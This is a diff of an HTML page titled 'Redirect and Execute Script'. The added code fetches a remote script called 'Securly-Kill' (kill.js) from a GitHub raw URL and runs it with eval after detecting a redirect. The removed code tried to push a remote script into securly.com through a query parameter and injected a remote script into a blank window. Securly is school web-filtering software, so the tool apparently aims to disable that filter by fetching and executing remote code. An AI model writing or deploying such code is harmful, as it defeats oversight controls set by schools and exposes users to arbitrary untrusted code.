@@ -5,34 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirect and Execute Script</title>
     <script>
-        window.addEventListener('load', () => {
-            const redirectUrl = 'https://securly.com'; // Target domain
-            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
+    // URL of the external script to inject
+    const externalScriptUrl = "https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js";
 
-            // Redirect the main page to securly.com
-            const queryParam = encodeURIComponent(scriptUrl);
-            const finalUrl = `${redirectUrl}?load_script=${queryParam}`;
+    // Function to load and execute the external script
+    function loadExternalScript(url) {
+        fetch(url)
+            .then(response => response.text())
+            .then(script => {
+                console.log("Injecting external script...");
+                eval(script); // Execute the script content
+            })
+            .catch(error => console.error("Failed to load the external script:", error));
+    }
 
-            // Open securly.com with script inclusion via query parameter
-            window.location.href = finalUrl;
-
-            // Optionally, open an about:blank window for debugging
-            const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
-            if (newWindow) {
-                newWindow.document.write('<!DOCTYPE html><html><head><title>Debug Window</title></head><body></body></html>');
-                newWindow.document.close();
-
-                // Fetch and inject script into the blank page for debugging purposes
-                fetch(scriptUrl)
-                    .then(response => response.text())
-                    .then(scriptContent => {
-                        const scriptElement = newWindow.document.createElement('script');
-                        scriptElement.textContent = scriptContent;
-                        newWindow.document.body.appendChild(scriptElement);
-                    })
-                    .catch(error => console.error('Error loading script:', error));
-            }
-        });
+    // Monitor the current URL for changes
+    const currentUrl = window.location.href;
+    const checkForRedirect = setInterval(() => {
+        if (window.location.href !== currentUrl) {
+            clearInterval(checkForRedirect); // Stop monitoring
+            console.log("Redirect detected! Executing script on redirected page...");
+            loadExternalScript(externalScriptUrl); // Inject the external script
+        }
+    }, 100); // Check every 100ms
     </script>
 </head>
 <body>
